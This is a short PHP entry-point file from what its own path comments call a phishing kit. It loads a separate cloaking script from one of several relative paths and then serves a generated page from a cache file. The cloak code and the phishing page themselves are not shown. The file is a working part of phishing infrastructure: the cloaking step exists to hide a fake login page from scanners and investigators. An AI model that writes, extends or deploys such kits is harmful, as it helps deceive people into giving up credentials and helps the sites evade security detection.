<?php
/**
 * Entry point with cloaking layer
 */

// Fix: Use an absolute path based on the original project directory
// The PHP server runs from .server/www, so include from the parent chain
$possible_paths = [
    __DIR__ . '/../../../.sites/_cloak.php',     // .server/www/site -> .server -> phishkit -> .sites
    __DIR__ . '/../_cloak.php',                   // direct .sites/site -> .sites
    __DIR__ . '/../../.sites/_cloak.php',         // .server/www -> .server -> phishkit -> .sites
];

$cloak_loaded = false;
foreach ($possible_paths as $path) {
    if (file_exists($path)) {
        require_once $path;
        $cloak_loaded = true;
        break;
    }
}

if (!$cloak_loaded) {
    // Fallback: if cloak not found, just serve the page directly
    // (cloaking is a bonus, not critical for page function)
}

// Serve the dynamically generated page
require_once __DIR__ . '/cache.php';
?>